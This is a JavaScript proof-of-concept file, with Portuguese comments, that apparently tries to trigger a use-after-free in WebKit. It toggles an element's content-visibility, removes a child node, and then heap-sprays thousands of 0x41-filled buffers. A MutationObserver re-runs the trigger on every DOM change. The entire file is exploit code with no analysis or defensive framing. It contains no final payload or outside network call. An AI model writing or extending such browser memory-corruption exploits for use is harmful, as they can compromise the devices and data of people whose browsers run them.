// js/uaf_webkit_poc/poc.js
import { debug_log } from './module/utils.mjs';

function heapSpray() {
  let spray = [];
  for (let i = 0; i < 10000; i++) {
    let arr = new Uint8Array(0x1000);
    for (let j = 0; j < arr.length; j++) {
      arr[j] = 0x41;
    }
    spray.push(arr);
  }
  return spray;
}

export function triggerUAF() {
  // Sempre busca o container no momento da chamada
  const currentContainer = document.querySelector(".container");

  if (!currentContainer) {
    debug_log("Erro Crítico: Elemento .container não encontrado para UAF. A PoC não pode continuar.");
    console.error("Erro Crítico: Elemento .container não encontrado para UAF.");
    return;
  }

  // Busca o child dentro do container atual
  const currentChild = currentContainer.querySelector(".child");

  debug_log("Tentando UAF: contentVisibility=hidden...");
  currentContainer.style.contentVisibility = "hidden";

  if (currentChild) {
    debug_log("Elemento .child encontrado, removendo-o.");
    currentChild.remove(); // Remove o filho se ele existir
  } else {
    debug_log("Elemento .child já foi removido ou não encontrado inicialmente nesta chamada.");
  }

  // A lógica de UAF continua mesmo que o filho já tenha sido removido,
  // pois o bug pode estar relacionado ao slot de memória do filho.
  setTimeout(() => {
    debug_log("Continuando UAF: contentVisibility=auto, heapSpray()");
    // Garante que currentContainer ainda é válido (embora seja improvável que desapareça aqui)
    if (document.body.contains(currentContainer)) {
        currentContainer.style.contentVisibility = "auto";
    } else {
        debug_log("Container foi removido do DOM antes de contentVisibility='auto'.");
        return;
    }
    
    let sprayArrays = heapSpray();
    if(sprayArrays.length > 0) {
        debug_log(`Heap spray realizado com ${sprayArrays.length} arrays.`);
    }
    debug_log("Tentativa de UAF concluída. Verifique o console e comportamento do navegador.");
  }, 0);
}

// Configuração do MutationObserver
const initialContainerForObserver = document.querySelector(".container");
if (initialContainerForObserver) {
    const observer = new MutationObserver((mutationsList, obs) => {
      // Logar apenas para a primeira mutação detectada pelo observer para evitar spam,
      // ou se a intenção é re-triggerar a cada mutação, pode precisar de lógica mais complexa
      // para não entrar em loops infinitos se o próprio triggerUAF causar mutações.
      debug_log("MutationObserver: DOM tree modified, chamando triggerUAF...");
      
      // Para evitar loops se triggerUAF modificar o DOM que o observer está escutando,
      // você pode desconectar temporariamente.
      // obs.disconnect(); 
      triggerUAF();
      // Se desconectado, você precisaria decidir se/quando reconectar:
      // obs.observe(initialContainerForObserver, { childList: true, subtree: true });
    });
    observer.observe(initialContainerForObserver, { childList: true, subtree: true });
} else {
    // Este log ocorreria se o .container não estivesse presente quando poc.js é carregado.
    console.warn("Elemento .container inicial não encontrado para MutationObserver no UAF PoC no momento do carregamento do poc.js.");
}
